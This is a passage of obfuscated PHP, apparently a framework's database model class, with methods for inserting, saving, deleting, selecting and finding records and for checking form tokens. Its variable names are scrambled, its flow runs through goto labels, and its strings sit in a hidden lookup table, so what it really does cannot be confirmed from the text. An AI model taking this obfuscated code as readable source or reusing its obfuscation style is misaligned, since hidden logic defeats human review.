$FËå•Öİ«[182]; $e´Ô¯º’Ì = $this->db->parseKey($e´Ô¯º’Ì); return $this->getField(strtoupper($A¨İÊ¨¨¶ƒ) . $FËå•Öİ«[253] . $e´Ô¯º’Ì . $FËå•Öİ«[254] . $A¨İÊ¨¨¶ƒ, $FËå•Öİ«[248]); } elseif (strtolower(substr($A¨İÊ¨¨¶ƒ, 0, 5)) == $FËå•Öİ«[255]) { $e´Ô¯º’Ì = think_parse_name(substr($A¨İÊ¨¨¶ƒ, 5)); $A½¡¾ãìÒ[$e´Ô¯º’Ì] = $fœÈØØ‘Á[0]; return $this->where($A½¡¾ãìÒ)->find(); } elseif (strtolower(substr($A¨İÊ¨¨¶ƒ, 0, 10)) == $FËå•Öİ«[256]) { $c÷¢òºÌ¢Ã = think_parse_name(substr($A¨İÊ¨¨¶ƒ, 10)); $A½¡¾ãìÒ[$c÷¢òºÌ¢Ã] = $fœÈØØ‘Á[0]; return $this->where($A½¡¾ãìÒ)->getField($fœÈØØ‘Á[1]); } elseif (isset($this->_scope[$A¨İÊ¨¨¶ƒ])) { return $this->scope($A¨İÊ¨¨¶ƒ, $fœÈØØ‘Á[0]); } elseif (method_exists($this, $A¨İÊ¨¨¶ƒ)) { array_unshift($fœÈØØ‘Á, $A¨İÊ¨¨¶ƒ); return call_user_func_array(array($this, $FËå•Öİ«[257]), $fœÈØØ‘Á); } else { return call_user_func_array(array(parent, $A¨İÊ¨¨¶ƒ), $fœÈØØ‘Á); } } protected function call() { goto Bƒ¸¤Ñ–Š; AÂ­‘Ñ¾ËŸ: if (isset($c¯œè´‡‘Ü[$Bï”©­†Á¬]) && $c¯œè´‡‘Ü[$Bï”©­†Á¬] === $Aæ¾ª¶ªàÎ) { think_exception(__CLASS__ . $CÂÃÍÀÙñˆ[4] . $Aæ¾ª¶ªàÎ . think_lang($CÂÃÍÀÙñˆ[258])); return; } $c¯œè´‡‘Ü[] = $Aæ¾ª¶ªàÎ; if (method_exists($this, $CÂÃÍÀÙñˆ[259])) { $F³ò¦®Îõ = call_user_func_array(array($this, $CÂÃÍÀÙñˆ[260]), array($DÀ¹‘ ¾–, $c¯œè´‡‘Ü)); if (!is_null($F³ò¦®Îõ) && $F³ò¦®Îõ !== !1) { return $F³ò¦®Îõ; } } goto aõÁ»¥½á; cšß……™î: $DÀ¹‘ ¾– = $Aæ¾ª¶ªàÎ; if (is_array($Aæ¾ª¶ªàÎ)) { $DÀ¹‘ ¾– = $Aæ¾ª¶ªàÎ[1]; $Aæ¾ª¶ªàÎ = $Aæ¾ª¶ªàÎ[0]; } $Bï”©­†Á¬ = count($c¯œè´‡‘Ü) - 1; goto AÂ­‘Ñ¾ËŸ; Bƒ¸¤Ñ–Š: $CÂÃÍÀÙñˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c¯œè´‡‘Ü = func_get_args(); $Aæ¾ª¶ªàÎ = array_shift($c¯œè´‡‘Ü); goto cšß……™î; aõÁ»¥½á: $fÑ÷Š×“á = call_user_func_array(array($this, $Aæ¾ª¶ªàÎ), $c¯œè´‡‘Ü); if (method_exists($this, $CÂÃÍÀÙñˆ[261])) { $F³ò¦®Îõ = call_user_func_array(array($this, $CÂÃÍÀÙñˆ[262]), array($DÀ¹‘ ¾–, $c¯œè´‡‘Ü, $fÑ÷Š×“á)); if ($F³ò¦®Îõ) { return $F³ò¦®Îõ; } } return $fÑ÷Š×“á; goto aŞ‘Ë¡‘Ùù; aŞ‘Ë¡‘Ùù: } protected function _initialize() { } protected function _facade($Bîà»”°­È) { $BÚæÙ‡¦ò¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!empty($this->fields)) { foreach ($Bîà»”°­È as $FŠ£·•™ˆÔ => $CÂÇ¥„ªÕø) { if (!in_array($FŠ£·•™ˆÔ, $this->fields, !0)) { unset($Bîà»”°­È[$FŠ£·•™ˆÔ]); } elseif (is_scalar($CÂÇ¥„ªÕø)) { $this->_parseType($Bîà»”°­È, $FŠ£·•™ˆÔ); } } } if (!empty($this->options[$BÚæÙ‡¦ò¨[263]])) { $Bîà»”°­È = array_map($this->options[$BÚæÙ‡¦ò¨[263]], $Bîà»”°­È); unset($this->options[$BÚæÙ‡¦ò¨[263]]); } $this->_beforeWrite($Bîà»”°­È); return $Bîà»”°­È; } protected function _beforeWrite(&$DÒ‡îËÎÎ¦) { } public function add($bÜ÷Á´ç“‚ = '', $E‚ÀÙ¹Œ¸Î = array(), $b»ÎˆÀù°Ë = false) { goto ašî—Ô¿´; ašî—Ô¿´: if (empty($bÜ÷Á´ç“‚)) { if (!empty($this->data)) { $bÜ÷Á´ç“‚ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ºÖÙÂŒäÉê‡][264]); return !1; } } $E‚ÀÙ¹Œ¸Î = $this->_parseOptions($E‚ÀÙ¹Œ¸Î); $bÜ÷Á´ç“‚ = $this->_facade($bÜ÷Á´ç“‚); goto eœÅØçÆÂ×; eœÅØçÆÂ×: if (!1 === $this->_beforeInsert($bÜ÷Á´ç“‚, $E‚ÀÙ¹Œ¸Î)) { return !1; } $EæŒ¼™Öî‹ = $this->db->insert($bÜ÷Á´ç“‚, $E‚ÀÙ¹Œ¸Î, $b»ÎˆÀù°Ë); if (!1 !== $EæŒ¼™Öî‹) { $DàÑ­©”¹¨ = $this->getLastInsID(); if ($DàÑ­©”¹¨) { $bÜ÷Á´ç“‚[$this->getPk()] = $DàÑ­©”¹¨; $this->_after_insert($bÜ÷Á´ç“‚, $E‚ÀÙ¹Œ¸Î); return $DàÑ­©”¹¨; } $this->_after_insert($bÜ÷Á´ç“‚, $E‚ÀÙ¹Œ¸Î); } goto eä°‰ÁÜ‡–; eä°‰ÁÜ‡–: return $EæŒ¼™Öî‹; goto dñã¤•”•—; dñã¤•”•—: } protected function _beforeInsert(&$D†Å¸›í, $E®ÌÅ“Æª©) { } protected function _after_insert($b„ñÔùöÂ¥, $c§å­íç…î) { } public function addAll($d Ï„ƒÎ¼Å, $d”ÖĞ®Ü£ = array(), $EÇšâ·É§ñ = false) { goto B¼Ñ ²”ñÜ; B¼Ñ ²”ñÜ: $CØôÉ‡‹º  =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($d Ï„ƒÎ¼Å)) { $this->error = think_lang($CØôÉ‡‹º [264]); return !1; } $d”ÖĞ®Ü£ = $this->_parseOptions($d”ÖĞ®Ü£); goto e¾¨§éŞ›è; e¾¨§éŞ›è: foreach ($d Ï„ƒÎ¼Å as $BÔÉÖÁŠ¦ => $AÜ¢“êí) { $d Ï„ƒÎ¼Å[$BÔÉÖÁŠ¦] = $this->_facade($AÜ¢“êí); } if (method_exists($this->db, $CØôÉ‡‹º [265])) { $AŒ·‹Øİ±• = $this->db->insertAll($d Ï„ƒÎ¼Å, $d”ÖĞ®Ü£, $EÇšâ·É§ñ); } else { $this->startTrans(); foreach ($d Ï„ƒÎ¼Å as $BÔÉÖÁŠ¦ => $AÜ¢“êí) { $AŒ·‹Øİ±• = $this->db->insert($AÜ¢“êí, $d”ÖĞ®Ü£, $EÇšâ·É§ñ); } $this->commit(); } if (!1 !== $AŒ·‹Øİ±•) { $B“††ß½– = $this->getLastInsID(); if ($B“††ß½–) { return $B“††ß½–; } } goto cÒÔóŒ„­; cÒÔóŒ„­: return $AŒ·‹Øİ±•; goto e³âÑ¦ˆ; e³âÑ¦ˆ: } public function selectAdd($FŸ‰‰Ú®Æ = '', $FÙ•ºÔøœ = '', $e®Ë©Ê—›ë = array()) { $eºæÏóğ†´ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e®Ë©Ê—›ë = $this->_parseOptions($e®Ë©Ê—›ë); if (!1 === ($aÃÔ‰²¿Ô¶ = $this->db->selectInsert($FŸ‰‰Ú®Æ ? $FŸ‰‰Ú®Æ : $e®Ë©Ê—›ë[$eºæÏóğ†´[266]], $FÙ•ºÔøœ ? $FÙ•ºÔøœ : $this->getTableName(), $e®Ë©Ê—›ë))) { $this->error = think_lang($eºæÏóğ†´[267]); return !1; } else { return $aÃÔ‰²¿Ô¶; } } public function save($bÁ¤ºšÎ  = '', $D˜‡¸Äã‰Š = array()) { goto D†Ã¡´Ú”; D†Ã¡´Ú”: $cèßÆëâ© =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($bÁ¤ºšÎ )) { if (!empty($this->data)) { $bÁ¤ºšÎ  = $this->data; $this->data = array(); } else { $this->error = think_lang($cèßÆëâ©[264]); return !1; } } $bÁ¤ºšÎ  = $this->_facade($bÁ¤ºšÎ ); goto dÙ£‘Â¨†; D©«•±Æ¤Í: if (!1 !== $CÅÒ¨¨ëÑ—) { if (isset($CØ„ò¡…‘­)) { $bÁ¤ºšÎ [$FÒªŞ¦ëƒñ] = $CØ„ò¡…‘­; } $this->_afterUpdate($bÁ¤ºšÎ , $D˜‡¸Äã‰Š); } return $CÅÒ¨¨ëÑ—; goto eœÂÌìƒ“Œ; dÙ£‘Â¨†: $D˜‡¸Äã‰Š = $this->_parseOptions($D˜‡¸Äã‰Š); $FÒªŞ¦ëƒñ = $this->getPk(); if (!isset($D˜‡¸Äã‰Š[$cèßÆëâ©[268]])) { if (isset($bÁ¤ºšÎ [$FÒªŞ¦ëƒñ])) { $FÛ‚Ó•´Š±[$FÒªŞ¦ëƒñ] = $bÁ¤ºšÎ [$FÒªŞ¦ëƒñ]; $D˜‡¸Äã‰Š[$cèßÆëâ©[268]] = $FÛ‚Ó•´Š±; unset($bÁ¤ºšÎ [$FÒªŞ¦ëƒñ]); } else { $this->error = think_lang($cèßÆëâ©[267]); return !1; } } goto eÚªÈÒ¶Œ”; eÚªÈÒ¶Œ”: if (is_array($D˜‡¸Äã‰Š[$cèßÆëâ©[268]]) && isset($D˜‡¸Äã‰Š[$cèßÆëâ©[268]][$FÒªŞ¦ëƒñ])) { $CØ„ò¡…‘­ = $D˜‡¸Äã‰Š[$cèßÆëâ©[268]][$FÒªŞ¦ëƒñ]; } if (!1 === $this->_beforeUpdate($bÁ¤ºšÎ , $D˜‡¸Äã‰Š)) { return !1; } $CÅÒ¨¨ëÑ— = $this->db->update($bÁ¤ºšÎ , $D˜‡¸Äã‰Š); goto D©«•±Æ¤Í; eœÂÌìƒ“Œ: } protected function _beforeUpdate(&$d±ÛÒœë¯ƒ, $a¥Æ›Ú£²) { } protected function _afterUpdate($a„ä†Âèã, $có•¦ª‘á ) { } public function delete($d¶¦‚õ¥² = array()) { goto D­¡Ä•‡×É; cÌå©†¦Ç—: if (is_numeric($d¶¦‚õ¥²) || is_string($d¶¦‚õ¥²)) { if (strpos($d¶¦‚õ¥², $Cƒ¥‰æ—[47])) { $b§’Ş²ã‰[$BÀ•ŠÈÔµ¸] = array($Cƒ¥‰æ—[269], $d¶¦‚õ¥²); } else { $b§’Ş²ã‰[$BÀ•ŠÈÔµ¸] = $d¶¦‚õ¥²; } $this->options[$Cƒ¥‰æ—[268]] = $b§’Ş²ã‰; } $d¶¦‚õ¥² = $this->_parseOptions(); if (is_array($d¶¦‚õ¥²[$Cƒ¥‰æ—[268]]) && isset($d¶¦‚õ¥²[$Cƒ¥‰æ—[268]][$BÀ•ŠÈÔµ¸])) { $CíçÒ—Ô« = $d¶¦‚õ¥²[$Cƒ¥‰æ—[268]][$BÀ•ŠÈÔµ¸]; } goto e²Ò‘İ½°¶; e²Ò‘İ½°¶: $cãŒêœ‰©– = $this->db->delete($d¶¦‚õ¥²); if (!1 !== $cãŒêœ‰©–) { $cö¶İÂİÓï = array(); if (isset($CíçÒ—Ô«)) { $cö¶İÂİÓï[$BÀ•ŠÈÔµ¸] = $CíçÒ—Ô«; } $this->_after_delete($cö¶İÂİÓï, $d¶¦‚õ¥²); } return $cãŒêœ‰©–; goto d“¸©Ï¸×ß; D­¡Ä•‡×É: $Cƒ¥‰æ— =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($d¶¦‚õ¥²) && empty($this->options[$Cƒ¥‰æ—[268]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $BÀ•ŠÈÔµ¸ = $this->getPk(); goto cÌå©†¦Ç—; d“¸©Ï¸×ß: } protected function _after_delete($Ağö‹‹ùºÏ, $D¡«—¯‚¤Æ) { } public function select($aø¨”‡–Ÿ = array()) { goto d¬ï›ßµÂ´; d¬ï›ßµÂ´: $fÅ±×²Ş‡¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_string($aø¨”‡–Ÿ) || is_numeric($aø¨”‡–Ÿ)) { $Fª¶èÒ³Í÷ = $this->getPk(); if (strpos($aø¨”‡–Ÿ, $fÅ±×²Ş‡¸[47])) { $a±øéœ²[$Fª¶èÒ³Í÷] = array($fÅ±×²Ş‡¸[269], $aø¨”‡–Ÿ); } else { $a±øéœ²[$Fª¶èÒ³Í÷] = $aø¨”‡–Ÿ; } $this->options[$fÅ±×²Ş‡¸[268]] = $a±øéœ²; } elseif (!1 === $aø¨”‡–Ÿ) { $aø¨”‡–Ÿ = $this->_parseOptions(); return $fÅ±×²Ş‡¸[270] . $this->db->buildSelectSql($aø¨”‡–Ÿ) . $fÅ±×²Ş‡¸[271]; } $aø¨”‡–Ÿ = $this->_parseOptions(); goto E¤†ğë¤ö; CâŠŸíøÉ‡: $this->_afterSelect($fÉŸÌÊ£å¯, $aø¨”‡–Ÿ); return $fÉŸÌÊ£å¯; goto eÄ„é˜ØÀº; E¤†ğë¤ö: $fÉŸÌÊ£å¯ = $this->db->select($aø¨”‡–Ÿ); if (!1 === $fÉŸÌÊ£å¯) { return !1; } if (empty($fÉŸÌÊ£å¯)) { return null; } goto CâŠŸíøÉ‡; eÄ„é˜ØÀº: } protected function _afterSelect(&$E¬Ó”‹¦¨, $E¨±‘¿ğğÙ) { } public function buildSql($Açİ¹±§Ò = array()) { $F‹¥îš¡Ğ… =& $_SERVER[ºÖÙÂŒäÉê‡]; $Açİ¹±§Ò = $this->_parseOptions($Açİ¹±§Ò); return $F‹¥îš¡Ğ…[270] . $this->db->buildSelectSql($Açİ¹±§Ò) . $F‹¥îš¡Ğ…[271]; } public function optionsValue($A«ê¯äëÕã = null) { if (is_null($A«ê¯äëÕã)) { return $this->options; } elseif (is_array($A«ê¯äëÕã)) { $this->options = array_merge($this->options, $A«ê¯äëÕã); } } protected function _parseOptions($aéæÎÏ™÷ = array()) { goto EÃ·îºŒ ¬; bĞƒáÜ™ê: if (!isset($aéæÎÏ™÷[$f…»í¿ÂÂÉ[272]])) { $aéæÎÏ™÷[$f…»í¿ÂÂÉ[272]] = $this->getTableName(); $bÅ‹ ¨ÄÓÒ = $this->fields; } else { $bÅ‹ ¨ÄÓÒ = $this->getDbFields(); } if (!empty($aéæÎÏ™÷[$f…»í¿ÂÂÉ[273]])) { $aéæÎÏ™÷[$f…»í¿ÂÂÉ[272]] .= $f…»í¿ÂÂÉ[50] . $aéæÎÏ™÷[$f…»í¿ÂÂÉ[273]]; } $aéæÎÏ™÷[$f…»í¿ÂÂÉ[274]] = $this->name; goto bÔ¬ÇÙ‘ ×; EÃ·îºŒ ¬: $f…»í¿ÂÂÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_array($aéæÎÏ™÷)) { $aéæÎÏ™÷ = array_merge($this->options, $aéæÎÏ™÷); } $this->options = array(); goto bĞƒáÜ™ê; bÔ¬ÇÙ‘ ×: if (isset($aéæÎÏ™÷[$f…»í¿ÂÂÉ[268]]) && is_array($aéæÎÏ™÷[$f…»í¿ÂÂÉ[268]]) && !empty($bÅ‹ ¨ÄÓÒ) && !isset($aéæÎÏ™÷[$f…»í¿ÂÂÉ[275]]) && !isset($aéæÎÏ™÷[$f…»í¿ÂÂÉ[272]])) { foreach ($aéæÎÏ™÷[$f…»í¿ÂÂÉ[268]] as $b ÆïĞÎ° => $cÇãÕ¡†ˆ) { $b ÆïĞÎ° = trim($b ÆïĞÎ°); if (in_array($b ÆïĞÎ°, $bÅ‹ ¨ÄÓÒ, !0)) { if (is_scalar($cÇãÕ¡†ˆ)) { $this->_parseType($aéæÎÏ™÷[$f…»í¿ÂÂÉ[268]], $b ÆïĞÎ°); } } elseif (!is_numeric($b ÆïĞÎ°) && $f…»í¿ÂÂÉ[70] != substr($b ÆïĞÎ°, 0, 1) && !1 === strpos($b ÆïĞÎ°, $f…»í¿ÂÂÉ[91]) && !1 === strpos($b ÆïĞÎ°, $f…»í¿ÂÂÉ[253]) && !1 === strpos($b ÆïĞÎ°, $f…»í¿ÂÂÉ[276]) && !1 === strpos($b ÆïĞÎ°, $f…»í¿ÂÂÉ[277])) { unset($aéæÎÏ™÷[$f…»í¿ÂÂÉ[268]][$b ÆïĞÎ°]); } } } $this->_options_filter($aéæÎÏ™÷); return $aéæÎÏ™÷; goto Cßò‡Úäç®; Cßò‡Úäç®: } protected function _options_filter(&$dÙÇÓ¢“œ) { } protected function _parseType(&$eùçàÖ÷¨¡, $CîáÑ‰Íµê) { $aƒãÅšï•Ï =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($this->options[$aƒãÅšï•Ï[278]][$aƒãÅšï•Ï[4] . $CîáÑ‰Íµê])) { $C’ˆÛ¼ÎÉ‡ = strtolower($this->fields[$aƒãÅšï•Ï[245]][$CîáÑ‰Íµê]); if (!1 !== strpos($C’ˆÛ¼ÎÉ‡, $aƒãÅšï•Ï[279])) { } elseif (!1 === strpos($C’ˆÛ¼ÎÉ‡, $aƒãÅšï•Ï[280]) && !1 !== strpos($C’ˆÛ¼ÎÉ‡, $aƒãÅšï•Ï[281])) { $eùçàÖ÷¨¡[$CîáÑ‰Íµê] = intval($eùçàÖ÷¨¡[$CîáÑ‰Íµê]); } elseif (!1 !== strpos($C’ˆÛ¼ÎÉ‡, $aƒãÅšï•Ï[282]) || !1 !== strpos($C’ˆÛ¼ÎÉ‡, $aƒãÅšï•Ï[283])) { $eùçàÖ÷¨¡[$CîáÑ‰Íµê] = floatval($eùçàÖ÷¨¡[$CîáÑ‰Íµê]); } elseif (!1 !== strpos($C’ˆÛ¼ÎÉ‡, $aƒãÅšï•Ï[284])) { $eùçàÖ÷¨¡[$CîáÑ‰Íµê] = (bool) $eùçàÖ÷¨¡[$CîáÑ‰Íµê]; } } } public function find($dÁ×³‰ Ğ˜ = array()) { goto fÜ —±Ä†§; AÖğÖ­«‚–: $dÁ×³‰ Ğ˜ = $this->_parseOptions(); $cƒÍò¹Ç®… = $this->db->select($dÁ×³‰ Ğ˜); if (!1 === $cƒÍò¹Ç®…) { return !1; } goto cõ÷öÕ‘Ï¬; fÈŒœËğØ²: if (!empty($this->options[$E¸Ş«ƒøÍÈ[286]])) { return $this->returnResult($this->data, $this->options[$E¸Ş«ƒøÍÈ[286]]); } return $this->data; goto dòËÃ‚Ú†; cõ÷öÕ‘Ï¬: if (empty($cƒÍò¹Ç®…)) { return null; } $this->data = $cƒÍò¹Ç®…[0]; $this->_afterFind($this->data, $dÁ×³‰ Ğ˜); goto fÈŒœËğØ²; fÜ —±Ä†§: $E¸Ş«ƒøÍÈ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (is_numeric($dÁ×³‰ Ğ˜) || is_string($dÁ×³‰ Ğ˜)) { $CßõŠ›ÍôŸ[$this->getPk()] = intval($dÁ×³‰ Ğ˜); $this->options[$E¸Ş«ƒøÍÈ[268]] = $CßõŠ›ÍôŸ; } $this->options[$E¸Ş«ƒøÍÈ[285]] = 1; goto AÖğÖ­«‚–; dòËÃ‚Ú†: } protected function _afterFind(&$C‹Ç«Ğ‘§, $Bâ‚ÒŞÖŠÂ) { } protected function returnResult($CÔ‰ÑôÊ¥Ş, $CšĞç÷™‘É = '') { $BäèÓ¯“Û =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($CšĞç÷™‘É) { if (is_callable($CšĞç÷™‘É)) { return call_user_func($CšĞç÷™‘É, $CÔ‰ÑôÊ¥Ş); } switch (strtolower($CšĞç÷™‘É)) { case $BäèÓ¯“Û[287]: return json_encode($CÔ‰ÑôÊ¥Ş); case $BäèÓ¯“Û[288]: return xml_encode($CÔ‰ÑôÊ¥Ş); } } return $CÔ‰ÑôÊ¥Ş; } public function parseFieldsMap($fŠ™ˆ«¾Ò®, $fƒ™í¥ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $cÚ¥èÏÔ‚Š => $A¿ªÒ¼ä) { if ($fƒ™í¥ == 1) { if (isset($fŠ™ˆ«¾Ò®[$A¿ªÒ¼ä])) { $fŠ™ˆ«¾Ò®[$cÚ¥èÏÔ‚Š] = $fŠ™ˆ«¾Ò®[$A¿ªÒ¼ä]; unset($fŠ™ˆ«¾Ò®[$A¿ªÒ¼ä]); } } else { if (isset($fŠ™ˆ«¾Ò®[$cÚ¥èÏÔ‚Š])) { $fŠ™ˆ«¾Ò®[$A¿ªÒ¼ä] = $fŠ™ˆ«¾Ò®[$cÚ¥èÏÔ‚Š]; unset($fŠ™ˆ«¾Ò®[$cÚ¥èÏÔ‚Š]); } } } } return $fŠ™ˆ«¾Ò®; } public function setField($EˆøÛô¿à¶, $E´¡ß¯‹‚ƒ = '') { if (is_array($EˆøÛô¿à¶)) { $c‚³ğÌ“ö = $EˆøÛô¿à¶; } else { $c‚³ğÌ“ö[$EˆøÛô¿à¶] = $E´¡ß¯‹‚ƒ; } return $this->save($c‚³ğÌ“ö); } public function setAdd($bÔæ‚œÒ“©, $EÍÌ·Ù¢–¶ = 1) { $aß£Š¥ŒÁ÷ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÎÄÀ²øíæ = $bÔæ‚œÒ“© . $aß£Š¥ŒÁ÷[289] . $EÍÌ·Ù¢–¶; if ($EÍÌ·Ù¢–¶ < 0) { $aÎÄÀ²øíæ = $bÔæ‚œÒ“© . $EÍÌ·Ù¢–¶; } return $this->setField($bÔæ‚œÒ“©, array($aß£Š¥ŒÁ÷[290], $aÎÄÀ²øíæ)); } public function getField($AÀäç¶å”, $cœ÷İ‰ùŞ = null) { $Aô”í’„ÕÈ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e”ïªº³Ø¾[$Aô”í’„ÕÈ[266]] = $AÀäç¶å”; $e”ïªº³Ø¾ = $this->_parseOptions($e”ïªº³Ø¾); $AÀäç¶å” = trim($AÀäç¶å”); if (strpos($AÀäç¶å”, $Aô”í’„ÕÈ[47])) { if (!isset($e”ïªº³Ø¾[$Aô”í’„ÕÈ[285]])) { $e”ïªº³Ø¾[$Aô”í’„ÕÈ[285]] = is_numeric($cœ÷İ‰ùŞ) ? $cœ÷İ‰ùŞ : $Aô”í’„ÕÈ[33]; } $DÉ®‹¦‡á = $this->db->select($e”ïªº³Ø¾); if (!empty($DÉ®‹¦‡á)) { goto bä¶Àå«×Ş; bä¶Àå«×Ş: $CŠ…´ë = explode($Aô”í’„ÕÈ[47], $AÀäç¶å”); $AÀäç¶å” = array_keys($DÉ®‹¦‡á[0]); $C­ì·‚ÂĞ = array_shift($AÀäç¶å”); goto f’‹§¢ÎÊ·; fèØ‹ÈÂ»”: foreach ($DÉ®‹¦‡á as $cÜ¥ƒöôÓ) { $Cëİ²×ğ±à = $cÜ¥ƒöôÓ[$C­ì·‚ÂĞ]; if (2 == $dº–±¾Œ¢) { $BÀ›ù ©ñ‘[$Cëİ²×ğ±à] = $cÜ¥ƒöôÓ[$dîš¼Ï“ß]; } else { $BÀ›ù ©ñ‘[$Cëİ²×ğ±à] = is_string($cœ÷İ‰ùŞ) ? implode($cœ÷İ‰ùŞ, $cÜ¥ƒöôÓ) : $cÜ¥ƒöôÓ; } } return $BÀ›ù ©ñ‘; goto fİ™ÅĞˆ­ì; f’‹§¢ÎÊ·: $dîš¼Ï“ß = array_shift($AÀäç¶å”); $BÀ›ù ©ñ‘ = array(); $dº–±¾Œ¢ = count($CŠ…´ë); goto fèØ‹ÈÂ»”; fİ™ÅĞˆ­ì: } } else { if (!0 !== $cœ÷İ‰ùŞ) { $e”ïªº³Ø¾[$Aô”í’„ÕÈ[285]] = is_numeric($cœ÷İ‰ùŞ) ? $cœ÷İ‰ùŞ : 1; } if ($cœ÷İ‰ùŞ === $Aô”í’„ÕÈ[248]) { unset($e”ïªº³Ø¾[$Aô”í’„ÕÈ[285]]); } $cÜ¥ƒöôÓ = $this->db->select($e”ïªº³Ø¾); if (!empty($cÜ¥ƒöôÓ)) { if ($cœ÷İ‰ùŞ === $Aô”í’„ÕÈ[248]) { return reset($cÜ¥ƒöôÓ[0]); } if (!0 !== $cœ÷İ‰ùŞ && 1 == $e”ïªº³Ø¾[$Aô”í’„ÕÈ[285]]) { return reset($cÜ¥ƒöôÓ[0]); } foreach ($cÜ¥ƒöôÓ as $Däà…¹´) { $f²š¿¥„³¡[] = $Däà…¹´[$AÀäç¶å”]; } return $f²š¿¥„³¡; } } return null; } public function create($D£êù“ìó§ = '', $F¡‘†ñ¸Ğ˜ = '') { goto B¼ÀÀ‰âº; CÑĞ´ÑŒàŠ: if (isset($AÕªˆ‘çà¸)) { if (is_string($AÕªˆ‘çà¸)) { $AÕªˆ‘çà¸ = explode($B…¬”ç½’¹[47], $AÕªˆ‘çà¸); } if (think_config($B…¬”ç½’¹[291])) { $AÕªˆ‘çà¸[] = think_config($B…¬”ç½’¹[292]); } foreach ($D£êù“ìó§ as $E—öÒ’³«£ => $Eƒ±í£–ğ) { if (!in_array($E—öÒ’³«£, $AÕªˆ‘çà¸)) { unset($D£êù“ìó§[$E—öÒ’³«£]); } } } if (!$this->autoValidation($D£êù“ìó§, $F¡‘†ñ¸Ğ˜)) { return !1; } if (!$this->autoCheckToken($D£êù“ìó§)) { $this->error = think_lang($B…¬”ç½’¹[293]); return !1; } goto FŞé“¢ö‰¨; fÂ—“šæÓí: return $D£êù“ìó§; goto b±‘ÓÁŸùÀ; A”Ç’¥øë°: $D£êù“ìó§ = $this->parseFieldsMap($D£êù“ìó§, 0); $F¡‘†ñ¸Ğ˜ = $F¡‘†ñ¸Ğ˜ ? $F¡‘†ñ¸Ğ˜ : (!empty($D£êù“ìó§[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$B…¬”ç½’¹[266]])) { $AÕªˆ‘çà¸ = $this->options[$B…¬”ç½’¹[266]]; unset($this->options[$B…¬”ç½’¹[266]]); } elseif ($F¡‘†ñ¸Ğ˜ == THINK_MODEL_INSERT && isset($this->insertFields)) { $AÕªˆ‘çà¸ = $this->insertFields; } elseif ($F¡‘†ñ¸Ğ˜ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $AÕªˆ‘çà¸ = $this->updateFields; } goto CÑĞ´ÑŒàŠ; FŞé“¢ö‰¨: if ($this->autoCheckFields) { $AÕªˆ‘çà¸ = $this->getDbFields(); foreach ($D£êù“ìó§ as $E—öÒ’³«£ => $Eƒ±í£–ğ) { if (!in_array($E—öÒ’³«£, $AÕªˆ‘çà¸)) { unset($D£êù“ìó§[$E—öÒ’³«£]); } elseif (MAGIC_QUOTES_GPC && is_string($Eƒ±í£–ğ)) { $D£êù“ìó§[$E—öÒ’³«£] = stripslashes($Eƒ±í£–ğ); } } } $this->autoOperation($D£êù“ìó§, $F¡‘†ñ¸Ğ˜); $this->data = $D£êù“ìó§; goto fÂ—“šæÓí; B¼ÀÀ‰âº: $B…¬”ç½’¹ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($D£êù“ìó§)) { $D£êù“ìó§ = $_POST; } elseif (is_object($D£êù“ìó§)) { $D£êù“ìó§ = get_object_vars($D£êù“ìó§); } if (empty($D£êù“ìó§) || !is_array($D£êù“ìó§)) { $this->error = think_lang($B…¬”ç½’¹[264]); return !1; } goto A”Ç’¥øë°; b±‘ÓÁŸùÀ: } public function autoCheckToken($dÉ–ø—¶Õ) { $dâÕêÃ¿ò =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset($this->options[$dâÕêÃ¿ò[294]]) && !$this->options[$dâÕêÃ¿ò[294]]) { return !0; } if (think_config($dâÕêÃ¿ò[291])) { $FË—¨ìÁĞœ = think_config($dâÕêÃ¿ò[292]); if (!isset($dÉ–ø—¶Õ[$FË—¨ìÁĞœ]) || Session::get($FË—¨ìÁĞœ)) { return !1; } list($B¼‰º÷’º, $dèîåÆº’ƒ) = explode($dâÕêÃ¿ò[70], $dÉ–ø—¶Õ[$FË—¨ìÁĞœ]); if ($dèîåÆº’ƒ && Session::get($FË—¨ìÁĞœ . $dâÕêÃ¿ò[91] . $B¼‰º÷’º) === $dèîåÆº’ƒ) { Session::remove($FË—¨ìÁĞœ . $dâÕêÃ¿ò[91] . $B¼‰º÷’º); return !0; } if (think_config($dâÕêÃ¿ò[295])) { Session::remove($FË—¨ìÁĞœ . $dâÕêÃ¿ò[91] . $B¼‰º÷’º); } return !1; } return !0; } public function regex($a«¹™¥©¨, $e©¼ƒ—âÍŒ) { $eê³Ãâ“ä =& $_SERVER[ºÖÙÂŒäÉê‡]; $f˜ËµáÍ ¨ = array($eê³Ãâ“ä[296] => $eê³Ãâ“ä[297], $eê³Ãâ“ä[298] => $eê³Ãâ“ä[299], $eê³Ãâ“ä[300] => $eê³Ãâ“ä[301], $eê³Ãâ“ä[302] => $eê³Ãâ“ä[303], $eê³Ãâ“ä[304] => $eê³Ãâ“ä[305], $eê³Ãâ“ä[306] => $eê³Ãâ“ä[307], $eê³Ãâ“ä[308] => $eê³Ãâ“ä[309], $eê³Ãâ“ä[283] => $eê³Ãâ“ä[310], $eê³Ãâ“ä[311] => $eê³Ãâ“ä[312]); if (isset($f˜ËµáÍ ¨[strtolower($e©¼ƒ—âÍŒ)])) { $e©¼ƒ—âÍŒ = $f˜ËµáÍ ¨[strtolower($e©¼ƒ—âÍŒ)]; } return preg_match($e©¼ƒ—âÍŒ, 